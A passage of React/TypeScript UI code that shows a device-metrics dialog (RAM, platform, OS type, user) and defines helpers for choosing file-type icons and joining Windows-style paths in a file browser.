                OF {selectedInfoDevice?.ram_total} MB TOTAL
              </div>
            </div>

            <div className="col-span-2 rounded-xl border border-white/5 bg-white/2 p-4">
              <div className="mb-2 flex items-center gap-2 text-neutral-500">
                <Monitor className="h-3 w-3" />
                <span className="text-[9px] font-black tracking-widest uppercase">
                  PLATFORM ARCH
                </span>
              </div>
              <div className="text-sm font-bold text-teal-400 uppercase">
                {selectedInfoDevice?.platform}
              </div>
              <div className="mt-1 flex items-center gap-2">
                <span className="rounded bg-teal-500/10 px-1.5 py-0.5 text-[9px] font-black text-teal-500 uppercase">
                  {selectedInfoDevice?.os_type}
                </span>
                <span className="font-mono text-[10px] tracking-tight text-neutral-600">
                  User: {selectedInfoDevice?.user}
                </span>
              </div>
            </div>
          </div>

          <div className="mt-6 flex justify-end">
            <Button
              variant="ghost"
              onClick={() => setIsInfoOpen(false)}
              className="text-xs font-black tracking-widest text-neutral-500 uppercase hover:text-white"
            >
              Close Metrics
            </Button>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
}

const getFileIcon = (name: string) => {
  const ext = name.split(".").pop()?.toLowerCase();
  switch (ext) {
    case "txt":
    case "docx":
    case "pdf":
      return (
        <FileText className="h-8 w-8 text-blue-400 transition-transform group-hover:scale-110" />
      );
    case "mp3":
    case "wav":
    case "flac":
      return (
        <Music className="h-8 w-8 text-purple-400 transition-transform group-hover:scale-110" />
      );
    case "mp4":
    case "mkv":
    case "avi":
      return (
        <Video className="h-8 w-8 text-rose-400 transition-transform group-hover:scale-110" />
      );
    case "jpg":
    case "jpeg":
    case "png":
    case "gif":
    case "webp":
      return (
        <ImageIcon className="h-8 w-8 text-emerald-400 transition-transform group-hover:scale-110" />
      );
    case "zip":
    case "rar":
    case "7z":
    case "tar":
    case "gz":
      return (
        <FileArchive className="h-8 w-8 text-amber-400 transition-transform group-hover:scale-110" />
      );
    case "js":
    case "ts":
    case "py":
    case "rs":
    case "cpp":
    case "cs":
    case "html":
    case "css":
      return (
        <FileCode className="h-8 w-8 text-orange-400 transition-transform group-hover:scale-110" />
      );
    case "json":
      return (
        <FileJson className="h-8 w-8 text-yellow-400 transition-transform group-hover:scale-110" />
      );
    default:
      return (
        <File className="h-8 w-8 text-blue-500 transition-transform group-hover:scale-110" />
      );
  }
};

const joinPath = (base: string, name: string) => {
  if (base === "THIS_PC") return name;
  if (base.endsWith("\\")) return base + name;
  return base + "\\" + name;
};
